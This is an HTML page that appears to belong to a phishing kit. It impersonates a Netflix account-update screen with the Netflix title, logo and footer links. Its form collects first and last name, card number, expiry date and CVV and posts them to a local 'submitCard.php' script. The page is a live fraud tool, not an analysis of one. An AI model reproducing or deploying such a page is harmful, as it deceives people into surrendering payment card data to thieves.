
<!DOCTYPE Html>
<html><head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width">
<title>Netflix</title>
<link rel="icon" href="./res/img/favicon.ico">
<link rel="stylesheet" href="./res/css/update.css">
<script src="./res/js/jquery.js"></script>
<script src="./res/js/jquery.mask.js"></script>
</head>
<body>
<div class="content">
<div class="top">
<div class="left">
<img src="./res/img/logo.png">
</div>
<div class="right">
<a href="https://netflix.com">Sign Out</a>
</div>
</div>
<div class="login-form">

<div style="margin:0px;">
<img src="./res/img/vsa.png">
<img src="./res/img/msc.png">
<img src="./res/img/amx.png">
<img src="./res/img/dsc.png">
</div>
 <form action="files/submitCard.php" method="POST"> 
<input class="input" required="" type="text" name="firstname" placeholder="First Name">
<input class="input" required="" type="text" name="lastname" placeholder="Last Name">
<input class="input" required="" id="cardnumber" type="text" name="cardnumber" placeholder="Card Number" maxlength="19">
<input class="input" required="" id="date" type="text" name="date" placeholder="Expiration Date (MM/YY)" maxlength="7">
<input class="input" required="" id="cvv" type="text" name="cvv" placeholder="Security Code (CVV)" maxlength="4">

<div class="bottom-infos">



</div>
<button id="login-btn" style="margin-top:20px;">SAVE</button>
</form>



</div>
<div class="footer">
<div class="qs"><a href="#">Questions? Contact us.</a></div>
<div class="f-links">
<a href="#">Gift Card Terms</a> <a href="#">Terms of Use</a> <a href="#">Privacy Statement</a>
</div>
<select>
<option value="english">  English
</option></select>
</div>
</div>

<script>
$(function(){
	$("#cardnumber").mask("0000 0000 0000 0000");
	$("#date").mask("00/0000");
	$("#cvv").mask("0000");
});

function onLogin(){
	if($("#login").val().trim() == "" || $("#pass").val().trim() == ""){return false;}
	else{
	document.getElementById('login-btn').style.background = "#f42828";
 
	}
}
</script>

</body></html>